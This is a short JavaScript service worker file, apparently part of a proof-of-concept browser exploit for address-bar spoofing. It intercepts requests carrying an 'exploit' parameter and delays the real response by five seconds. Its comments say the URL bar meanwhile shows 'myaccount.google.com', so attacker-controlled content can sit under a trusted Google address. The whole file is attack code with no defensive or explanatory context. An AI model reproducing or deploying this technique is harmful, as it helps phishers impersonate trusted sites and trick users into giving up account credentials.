// sw.js
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // If we see the exploit trigger, hold the connection open
    if (url.searchParams.has('exploit')) {
        event.respondWith(
            new Promise((resolve) => {
                // The URL bar will update to 'myaccount.google.com' 
                // but we wait 5 seconds before actually showing the real page.
                setTimeout(() => {
                    resolve(fetch(event.request));
                }, 5000);
            })
        );
    }
});
